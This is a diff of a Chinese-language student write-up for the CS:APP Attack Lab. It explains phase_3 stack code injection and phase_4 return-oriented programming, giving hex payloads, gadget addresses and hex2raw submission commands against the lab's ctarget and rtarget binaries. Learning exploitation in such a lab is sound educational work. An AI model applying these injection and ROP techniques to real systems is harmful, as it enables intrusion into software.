@@ -11,7 +11,7 @@
 #### execute
 
 Please look!!!
-	There is to old for ctarget, so we need to fix some problem, otherwise we will get fault without 	typing in some string!
+	There is to old for `ctarget`, so we need to fix some problem, otherwise we will get fault without 	typing in some string!
 	So we search the blog and then found the solutions that we can add a printf.so to fix it!
 this is the address I found [solution for printf.so](https://blog.rijuyuezhu.top/posts/db646f34/) and the printf.so is just at this address!
 
@@ -27,7 +27,7 @@ gdb ctarget
 (gdb) info register # when you come after getting the 40bytes stack memory
 ```
 
-
+# 直接注入攻击
 
 ## phase_1
 
@@ -227,3 +227,109 @@ ec 17 40 00 c3 00 00 00 # 很坑的一个地方，需要停下来看一下
 ```
 
 ## phase_3
+
+#### 题目介绍
+
+这和`phase_2`是一样的，只不过在`touch2`里面检测的是数值，这个是通过字符串检测，同时有一个很关键的点，在`touch3`里面分配了一个`110bytes`的char数组，并且这个数组填入数据的区域是随机化的，也就是我们不能在`touch3`的栈帧中插入数据，否则会因为随机化导致数据丢失使得不是100%成功。
+
+大概注入的过程就是下面的流程图![image-20250410121226266](./img/image-20250410121226266.png)
+
+#### 题目解析
+
+由于和`phase_2`十分的相似，这里只需要多一个步骤就是找出注入字符串的起始地址，这个地址是在test完成`8bytes`的栈空间分配之后的地址，查看汇编代码中发现这`8bytes`的地址并未被使用，不知道是否用来缓冲的，不管了不影响做题。
+
+> `call`指令相当于使用`push`指令将当前指令的下一个指令地址存到栈上并跳转目标函数地址，是两个步骤，并且会在栈空间上多使用一个`8bytes`的空间
+>
+> `ret`指令会跳转回存储的指令地址并将指令地址`pop`出来，此时栈空间就会失去存储这个指令地址的`8bytes`空间
+
+所以解释了为什么我们的字符串注入需要注入在`test`的栈帧中而不是注入在`getbuf`中，因为`getbuf`栈帧中注入的时候，调用`touch3`函数的时候这一部分区域都是随机化存储字符串的空间，会导致存储在栈上的字符串被修改导致数据丢失
+
+同理还是使用gdb调试发现注入字符串的起始地址是`0x5561dcb0`，然后需要注入的字符串就是`cookie`对应的字符串，稍加修改一下`phase_2`的注入机器码即可
+
+```
+48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+使用官方的工具提交
+
+```bash
+./hex2raw  < phase_3.txt | LD_PRELOAD=./printf.so ./ctarget -q
+```
+
+# 面向返回编程
+
+在实验的第二阶段启用了防御策略使得直接代码注入变得不切实实际，主要有两个原因
+
+- 栈随机化
+- 栈上代码不可执行
+
+因此为了解决这种栈上代码不可执行的策略，我能否直接使用已有的代码片段呢，事实证明就是需要使用已有的代码片段，通过注入来修改第一次的返回地址然后使得程序进入我们设置的调用代码片段链
+
+> 通过每次的代码结尾都是ret来使得程序一直跳转到需要执行的代码片段，然后跳转的地址通过注入来写入就可以使得程序按照注入的地址来不断的执行代码片段来达到一些逻辑功能
+
+## phase_4
+
+本题和`phase_2`是一样的，都是需要成功调用`touch2`，但是不一样的地方就是从代码注入变成利用已有的代码片段，我们先查看原有的`phase_2`的执行策略
+
+```assembly
+movq    $0x59b997fa, %rdi # 将cookie的值赋值给rdi
+pushq   $0x4017ec #将touch2的地址放在栈中
+ret  #跳转touch2
+```
+
+拆解这些代码可以知道我们先将cookie放在栈上，然后使用`pop`指令将cookie的值放在某个寄存器中，再将这个寄存器赋值给`rdi`，最后返回`touch2`的指令地址，具体的执行过程如图所示
+
+![image-20250410135123434](./img/image-20250410135123434.png)
+
+根据这个图找出我们需要找到的元素
+
+```assembly
+# popq %rax ==> 58 因此找到如下的工具1，其中90是nop指令，不影响
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	ret   
+```
+
+```assembly
+# movq %rax, %rdi ==> 89 c7 因此找到工具2
+00000000004019c3 <setval_426>:
+  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+  4019c9:       c3                      retq
+```
+
+- 工具1地址--->`0x4019ab`
+- 工具2地址--->`0x4019c5`
+- cookie的值--->`0x59b997fa`
+- touch2地址--->`0x4017ec`
+
+> 工具1和工具2的地址需要将指令通过查表找到机器码，通过查找功能找到机器码在`rtarget`中存在的片段位置，然后找到具体的起始地址即可，注意需要以ret结尾
+>
+> `nop`指令不影响任何东西
+
+通过逻辑的整合和地址的准备，因此我们可以获取这个需要输入的机器码
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+```bash
+./hex2raw  < phase_4.txt | LD_PRELOAD=./printf.so ./rtarget -q
+```
+
+## phase_5
+
+来到了最后一个了，还没开始做就听说这个环节很难
